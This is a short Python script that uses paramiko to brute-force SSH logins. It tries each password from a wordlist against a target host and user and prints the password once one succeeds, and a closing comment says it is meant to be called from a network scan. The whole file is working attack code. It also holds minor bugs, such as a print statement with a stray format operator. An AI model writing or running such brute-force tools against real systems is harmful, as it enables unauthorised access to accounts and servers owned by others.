import paramiko
import socket,args


def brute_pass(target, usr, sshport, pass_file):
    try:
        f=open(pass_file, "r")
        for pwd in f:
            pwd=pwd[:-1]
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target, sshport, usr, pwd)
                print("Password is %s"%pwd)
                break;
            except paramiko.AuthenticationException:
                print("Bad Password is %s"%pwd)
                ssh.close()
            except socket.error:
                print("Failed connection")
                break;
        ssh.close()
    except IOError:
        print("File not found!"%pass_file)


#add args and call it from network scan
